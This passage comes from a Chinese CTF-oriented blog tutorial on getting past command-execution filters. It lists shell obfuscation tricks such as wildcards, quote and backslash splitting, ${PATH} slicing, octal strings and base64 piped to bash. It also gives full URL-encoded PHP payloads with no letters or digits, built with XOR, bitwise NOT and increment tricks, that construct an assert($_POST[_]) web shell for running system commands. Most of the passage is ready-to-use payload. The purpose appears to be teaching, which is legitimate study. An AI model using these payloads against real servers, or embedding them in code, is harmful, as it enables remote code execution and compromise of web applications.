+<h5 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h5><p>&emsp;&emsp;通配符是整个操作系统都认可的一种形式，用来模糊搜索文件。只有这两个?和*<br>&emsp;&emsp;?可以代表任何<code>单个</code>字符串，来让系统自行继续匹配搜索。例如<font color=blue>cat fl?g.tx?</font><br>&emsp;&emsp;*可以进行模糊匹配，代表任何字符串，让系统自己猜我要什么- ̗̀(๑ᵔ⌔ᵔ๑)。例如<font color=red>cat f*</font>(如果有多个匹配结果会同时显示)</p>
+<h5 id="单双引号绕过"><a href="#单双引号绕过" class="headerlink" title="单双引号绕过"></a>单双引号绕过</h5><p>&emsp;&emsp;原理就是接一个’’或者””里面什么都没有默认空字符，然后系统再拼接在一起，例如<font color=blue>cat fl’’ag.ph””p</font></p>
+<h5 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h5><p>&emsp;&emsp;这个就是将特性字符去掉功能性，单纯表示为字符串，比如反引号，要想表现出来得在前面加, 比如”`“(这里我加了,只是你们看不到而已)同理，我们就可以用它将他们分隔开，在命令中同样有效，例如<font color=red>cat fl\ag.t\xt</font>  </p>
+<h5 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h5><p>&emsp;&emsp;上面就有提到，$9作为特殊的环境变量，代表着空字符，所以也可以用，例如<font color=blue>cat fl$9.txt</font>  </p>
+<h5 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h5><p>&emsp;&emsp; 之前不是说过操作系统链接符可以顺序嘛，我们就可以先自定义字符串，再拼接起来,例如<font color=red>a&#x3D;f;d&#x3D;ag;c&#x3D;l;cat $a$c$d.txt</font>  </p>
+<h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p>&emsp;&emsp;众所周知，目标服务器在识别到编码后会自动解码读取命令并执行，就可以绕过那个笨比检测了（Ｕ・ω・）⊃<br>&emsp;&emsp;比如最熟悉的base编码（64,32都可），将命令编码一下再传输就可以了。通常通过管道符执行命令。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> Y2FOIGZsYWcucGhw | <span class="built_in">base64</span> -d  | bash</span><br></pre></td></tr></table></figure>
+
+<h5 id="重定向绕过"><a href="#重定向绕过" class="headerlink" title="重定向绕过"></a>重定向绕过</h5><p>&emsp;&emsp;呐，又是这两个&gt;,&gt;&gt;。知道一下就可以（其实是我也不擅长doge），通常用来做长度限制绕过的，不常用。  </p>
+<p>  &emsp;&emsp;下面的方法专门针对单独过滤情况。  </p>
+<h5 id="利用Linux的环境变量和区间取值"><a href="#利用Linux的环境变量和区间取值" class="headerlink" title="利用Linux的环境变量和区间取值"></a>利用Linux的环境变量和区间取值</h5><p>&emsp;&emsp;在Linux中PATH是默认系统环境变量，我们可以使用特殊的调用方法，来提取相应的字符，每个字符对应一个下标，从0开始，跟数组一样。但有限，论好用还得是区间取值。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> f<span class="variable">$&#123;PATH:5:1&#125;</span><span class="variable">$&#123;PATH:8:1&#125;</span><span class="variable">$&#123;PATH:72:1&#125;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;区间取值就是顾名思义，用[]框起来表示范围，然后让Linux自行匹配。顺带提一句，八进制也可以执行。</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">more <span class="selector-attr">[d-h]</span><span class="selector-attr">[k-m]</span><span class="selector-attr">[9-z]</span><span class="selector-attr">[e-h]</span></span><br><span class="line">$<span class="string">&#x27;\143\141\164&#x27;</span> $<span class="string">&#x27;\146\154\141\147&#x27;</span>  <span class="comment">//cat flag</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/images/PATH.png" alt="PATH"></p>
+<h4 id="无字母数字绕过"><a href="#无字母数字绕过" class="headerlink" title="无字母数字绕过"></a>无字母数字绕过</h4><p>&emsp;&emsp;上面那个只是过滤了一些特定字符，而这种不仅过掉了所有字母，还有数字。那该怎么办呢，还有符号呢！！！我们只需构造出新的变量就可以跑去那边shell了。统一构造<code>assert($_POST[])</code>。而不能使用的字符数字我们可以使用<code>URL 编码</code>绕过。<font color=black>注：针对php5版本，在学web的时候，要对版本很敏感，不同的版本有不同的特性和方法。</font></p>
+<h5 id="异或运算绕过"><a href="#异或运算绕过" class="headerlink" title="异或运算绕过"></a>异或运算绕过</h5><p>&emsp;&emsp;异或^就是两位对象转成二进制0和1相比较，既然异或可以，那么单独的或|和与&amp;也是可以的，<font color=pink>相同为零，不同为1。</font>根据上面所说的，则有a:’%40’^’%21’ ; s:’%7B’^’%08’ ; s:’%7B’^’%08’ ; e:’%7B’^’%1E’ ; r:’%7E’^’%0C’ ; t:’%7C’^’%08’; P:’%0D’^’%5D’ ; O:’%0F’^’%40’ ; S:’%0E’^’%5D’ ; T:’%0B’^’%5F’<br>&emsp;&emsp;拼接起来就为：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);<span class="variable">$___</span>=$<span class="variable">$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="regexp">//</span>assert(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp; 然后POST那边就可以命令执行了，例如<font color=blue>_&#x3D;system(“cat flag.php”)</font></p>
+<h5 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h5><p>&emsp;&emsp;取反~就是assert和_POST取反（废话），就不多说了，直接上payload</p>
+<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;它还有一种方法，就是文字取反，感兴趣的可以去搜搜。它的payload有点长，可以先去本地试一下。</p>
+<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">%24_%2B%2B%3B%24__%20%3D%20%22%E6%9E%81%22%3B%24___%20%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8C%BA%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E7%9A%AE%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8D%81%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8B%BA%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24____%20%3D%20<span class="string">&#x27;_&#x27;</span>%3B%24__%20%3D%20%22%E5%AF%B8%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%B0%8F%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E6%AC%A0%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E7%AB%8B%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24_%20%3D%20%24%24____%3B%24___(%24_%5B_%5D)%3B</span><br></pre></td></tr></table></figure>
+
+<h5 id="自增绕过"><a href="#自增绕过" class="headerlink" title="自增绕过"></a>自增绕过</h5><p>&emsp;&emsp;原理就是, 嗯……，直接看其他师傅的吧：<a href="https://www.cnblogs.com/pursue-security/p/15404150.html">无字母数字</a>，他那边的payload跟我的是一样，甚至前面还有源码和解释。</p>
+<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B<span class="string">&#x27;!&#x27;</span>%3D%3D<span class="string">&#x27;%40&#x27;</span>%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D<span class="string">&#x27;_&#x27;</span>%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B</span><br></pre></td></tr></table></figure>
+
+<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>&emsp;&emsp;你已经划到这了，我就默认你看完了哈。恭喜你，已经学了很多知识了，当然还有更多的知识等着你，不知道你有没有看完另外两大知识点呢——&gt;文件包含，文件上传。这三个统称为WEB三巨头，后面还有SQL，SSTI，反序列等知识期待你来学，别着急，慢慢来。 ( ੭ ˙ᗜ˙ )੭</p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>命令执行</tag>
       </tags>
   </entry>
   <entry>
